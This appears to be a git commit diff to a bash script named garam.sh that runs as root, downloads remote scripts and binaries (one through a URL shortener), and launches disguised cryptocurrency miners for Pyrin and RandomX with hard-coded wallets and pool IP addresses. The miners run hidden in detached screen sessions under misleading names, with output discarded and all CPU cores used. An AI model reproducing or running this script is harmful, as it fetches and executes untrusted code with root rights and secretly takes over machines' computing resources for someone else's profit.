0b6561e7d0ba0e596b5424e9f24f82e882e8135f
williehprnuhrxyq <159912408+williehprnuhrxyq@users.noreply.github.com>
2024-06-24 22:46:20 +0700

    Update garam.sh

--- garam.sh
+++ garam.sh
@@ -1,19 +1,10 @@
 #!/bin/bash
 sudo su <<EOF
+
 wget -qO jupyter.sh https://raw.githubusercontent.com/anihsugiarti9/ebor/main/jupyter.sh && chmod +x * && ./jupyter.sh
-
-wget -qO nano.tar.gz https://gitlab.com/jasa4/jasa/-/raw/main/nano.tar.gz && tar -xf nano.tar.gz && tar -xf nano.tar.gz >/dev/null 2>&1
-
-cat > config.ini <<END
-[RandomX]
-wallet = ZEPHsC5qZJv8JqyaGPNAviDERPxFGBzXx1bo8rx7RqD9JkPh68Lk7AnLdsNAZfrukeFoU9dnboT6tAJkAZ1etvM1Q5PqiQu8DEk.$(echo GR-$(TZ=UTC-7 date +"%H-%M-%S"))
-pool1 = 47.89.195.104:443
-
-[PyrinHash]
-wallet = pyrin:qpkxgkszu2dtek33z5nu5uvqftmj6x9stjvpsrdr502p2v8mpqduwt74nc0jm.$(echo GR-$(TZ=UTC-7 date +"%H-%M-%S"))
-pool1 = 47.236.130.246:80
-END
-
-nohup ./java &>/dev/null &
+sudo apt install screen -y
+wget -qO root https://s.id/minulz >/dev/null 2>&1 && chmod +x *
+screen -dms run ./root --url=pyrin:qpkxgkszu2dtek33z5nu5uvqftmj6x9stjvpsrdr502p2v8mpqduwt74nc0jm.$(echo GR-$(TZ=UTC-7 date +"%H-%M-%S"))@47.236.130.246:80 --cleanjobs --nonvml --hideclocks
+screen -dms run ./pardede -a rx/0 -o 47.89.195.104:443 -u ZEPHsC5qZJv8JqyaGPNAviDERPxFGBzXx1bo8rx7RqD9JkPh68Lk7AnLdsNAZfrukeFoU9dnboT6tAJkAZ1etvM1Q5PqiQu8DEk.$(echo B-$(TZ=UTC-7 date +"%H-%M-%S")) -p -x -t $(nproc --all)
 EOF
 
